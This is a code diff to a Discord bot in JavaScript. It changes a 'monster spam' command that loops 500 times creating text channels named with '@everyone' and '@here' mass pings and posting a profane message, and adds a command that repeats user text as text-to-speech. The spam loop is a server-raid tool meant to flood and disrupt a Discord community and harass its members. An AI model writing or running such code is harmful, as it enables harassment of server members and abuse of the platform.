@@ -16,11 +16,21 @@ client.on('message', msg => {
 client.on('message' , async (message) => {
     if (message.content.startsWith('monster spam')) {
 for (let i = 0; i < 500; i++) {
-        message.guild.createChannel('hello bitches', 'text')
+        message.guild.createChannel('@everyone hello bitches @here', 'text')
         message.channel.send('hello bitches');
 }
 }
 });   
+
+
+client.on('message' , message => {
+      var args = message.content.split(" ").slice(1).join(' ');
+    if(message.content.startsWith('tts')) {
+    message.channel.send(args , {tts: true});
+    }
+});
+
+
 
 
 const developers = ["348555232529219585","411081496485691392"]
